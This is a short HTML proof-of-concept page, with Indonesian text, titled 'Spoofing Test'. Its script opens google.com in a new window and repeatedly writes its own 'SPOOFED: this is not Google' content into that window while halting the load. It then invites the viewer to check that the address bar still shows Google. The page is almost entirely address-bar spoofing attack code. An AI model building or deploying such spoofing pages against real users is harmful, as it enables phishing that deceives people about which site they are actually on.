<!DOCTYPE html>
<html>

<head>
    <title>Spoofing Test</title>
</head>

<body>
    <button onclick="doSpoof()" style="padding:20px;">Jalankan Spoof Ke Google</button>

    <script>
        function doSpoof() {
            let win = window.open("https://www.google.com/", "_blank");
            let i = 0;
            let timer = setInterval(() => {
                i++;
                try {
                    win.document.write("<h1>SPOOFED: Ini bukan Google</h1>");
                    win.document.write("<p>Tapi liat Address Bar di atas, tulisannya apa?</p>");
                    win.stop();
                    if (i > 10) {
                        clearInterval(timer);
                        win.document.close();
                    }
                } catch (e) {
                }
            }, 5);
        }
    </script>
</body>

</html>
